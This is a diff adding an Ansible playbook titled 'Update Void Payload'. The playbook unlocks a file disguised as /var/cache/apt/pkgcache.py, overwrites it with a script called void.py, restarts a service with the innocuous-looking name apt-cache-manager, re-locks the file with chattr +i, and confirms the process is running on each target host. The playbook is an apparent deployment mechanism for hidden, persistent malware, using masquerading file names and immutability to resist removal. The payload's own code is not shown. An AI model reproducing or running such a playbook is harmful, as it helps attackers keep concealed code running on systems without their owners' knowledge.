@@ -1,0 +1,34 @@
+---
+- name: Update Void Payload
+  hosts: targets
+  become: yes
+  tasks:
+
+    - name: Remove immutable flag
+      shell: chattr -i /var/cache/apt/pkgcache.py
+      ignore_errors: yes
+
+    - name: Push updated script
+      copy:
+        src: files/void.py
+        dest: /var/cache/apt/pkgcache.py
+        mode: '0755'
+
+    - name: Restart service
+      systemd:
+        name: apt-cache-manager
+        state: restarted
+        daemon_reload: yes
+
+    - name: Reapply immutable flag
+      shell: chattr +i /var/cache/apt/pkgcache.py
+      ignore_errors: yes
+
+    - name: Confirm running
+      shell: pgrep -f pkgcache.py
+      register: pid_out
+      ignore_errors: yes
+
+    - name: Show PID
+      debug:
+        msg: "Updated and running on {{ inventory_hostname }} with PID {{ pid_out.stdout }}"
